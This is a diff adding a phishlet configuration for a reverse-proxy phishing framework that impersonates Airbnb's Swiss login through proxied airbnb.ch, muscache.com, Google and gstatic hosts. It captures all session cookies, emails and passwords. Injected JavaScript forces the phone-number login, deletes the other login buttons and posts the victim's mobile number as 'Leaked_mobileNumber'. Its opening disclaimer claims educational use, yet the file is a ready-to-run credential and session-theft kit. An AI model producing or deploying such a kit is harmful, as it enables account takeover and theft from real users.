@@ -1,0 +1,147 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+
+# Replace 'airbnb.ch' with your Server country Domain name of Airbnb.
+# Login With Email Will Not Work Due To Catpcha Failures.
+# Respective Javascripts Has been Added in Order to trigger, Login With Mobile Number.
+
+author: '@AN0NUD4Y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'airbnb.ch', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'airbnb.ch', session: true, is_landing: false}
+  - {phish_sub: 'muscache', orig_sub: 'a0', domain: 'muscache.com', session: true, is_landing: false}
+  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false}
+  - {phish_sub: 'gstatic', orig_sub: '', domain: 'gstatic.com', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'www.airbnb.ch', orig_sub: 'www', domain: 'airbnb.ch', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.airbnb.ch', orig_sub: 'www', domain: 'airbnb.ch', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.airbnb.ch', orig_sub: 'www', domain: 'airbnb.ch', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'www.airbnb.ch', orig_sub: 'www', domain: 'airbnb.ch', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.airbnb.ch', orig_sub: 'www', domain: 'airbnb.ch', search: 'https://{domain}', replace: 'https://{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.airbnb.ch', orig_sub: 'www', domain: 'airbnb.ch', search: 'https%3A%2F%2F{domain}', replace: 'https%3A%2F%2F{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'www.airbnb.ch', orig_sub: 'a0', domain: 'muscache.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.airbnb.ch', orig_sub: 'a0', domain: 'muscache.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.airbnb.ch', orig_sub: 'a0', domain: 'muscache.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'www.airbnb.ch', orig_sub: 'www', domain: 'google.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.airbnb.ch', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.airbnb.ch', orig_sub: 'www', domain: 'google.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'www.airbnb.ch', orig_sub: '', domain: 'gstatic.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.airbnb.ch', orig_sub: '', domain: 'gstatic.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.airbnb.ch', orig_sub: '', domain: 'gstatic.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'airbnb.ch', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'airbnb.ch', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'airbnb.ch', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'www.google.com', orig_sub: 'a0', domain: 'muscache.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.google.com', orig_sub: 'a0', domain: 'muscache.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.google.com', orig_sub: 'a0', domain: 'muscache.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'www.google.com', orig_sub: '', domain: 'gstatic.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.google.com', orig_sub: '', domain: 'gstatic.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.google.com', orig_sub: '', domain: 'gstatic.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'airbnb.ch', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'airbnb.ch', search: 'https://{domain}', replace: 'https://{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'airbnb.ch', search: 'https%3A%2F%2F{domain}', replace: 'https%3A%2F%2F{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'gstatic.com', orig_sub: 'www', domain: 'airbnb.ch', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'gstatic.com', orig_sub: 'www', domain: 'airbnb.ch', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'gstatic.com', orig_sub: 'www', domain: 'airbnb.ch', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'gstatic.com', orig_sub: 'a0', domain: 'muscache.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'gstatic.com', orig_sub: 'a0', domain: 'muscache.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'gstatic.com', orig_sub: 'a0', domain: 'muscache.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'gstatic.com', orig_sub: 'www', domain: 'google.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'gstatic.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'gstatic.com', orig_sub: 'www', domain: 'google.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'gstatic.com', orig_sub: '', domain: 'gstatic.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'gstatic.com', orig_sub: '', domain: 'gstatic.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'gstatic.com', orig_sub: '', domain: 'gstatic.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  - {triggers_on: 'gstatic.com', orig_sub: 'www', domain: 'airbnb.ch', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'gstatic.com', orig_sub: 'www', domain: 'airbnb.ch', search: 'https://{domain}', replace: 'https://{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'gstatic.com', orig_sub: 'www', domain: 'airbnb.ch', search: 'https%3A%2F%2F{domain}', replace: 'https%3A%2F%2F{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+
+auth_tokens:
+  - domain: '.airbnb.ch'
+    keys: ['.*,regexp'] 
+  - domain: 'www.airbnb.ch'
+    keys: ['.*,regexp']
+  - domain: 'airbnb.ch'
+    keys: ['.*,regexp']
+  - domain: 'a0.muscache.com'
+    keys: ['.*,regexp']
+  - domain: '.muscache.com'
+    keys: ['.*,regexp']
+
+auth_urls:
+  - '/*'
+  - '/'
+
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'Leaked_mobileNumber'
+      search: '(.*)'
+      type: 'post'
+login:
+  domain: 'www.airbnb.ch'
+  path: '/login'
+js_inject:
+  - trigger_domains: ["www.airbnb.ch"]
+    trigger_paths: ["/login","/","/*"]
+    trigger_params: []
+    script: |
+      function get_mobile_login(){
+        document.getElementsByClassName("_1d079j1e")[1].click();
+        return;
+      }
+      setTimeout(function(){ get_mobile_login(); }, 2000);
+      
+      function remove_login_buttons() {
+          var elem = document.querySelectorAll("button[type=submit]")[1]
+          var elem1 = document.querySelectorAll("button[type=submit]")[2]
+          var elem2 = document.querySelectorAll("button[type=submit]")[3]
+          elem.parentNode.removeChild(elem);
+          elem1.parentNode.removeChild(elem1);
+          elem2.parentNode.removeChild(elem2);
+        return;
+      }
+      setTimeout(function(){ remove_login_buttons(); }, 2000);
+      
+      function lp(){
+        var submit = document.querySelectorAll('button[type=submit]')[0];
+        submit.setAttribute("onclick", "sendMobile()");
+        return;
+      }
+      function sendMobile(){
+        var mobile = document.getElementsByName("phoneNumber")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("Leaked_mobileNumber="+encodeURIComponent(mobile));
+        return;
+      }
+      setTimeout(function(){ lp(); }, 2000);
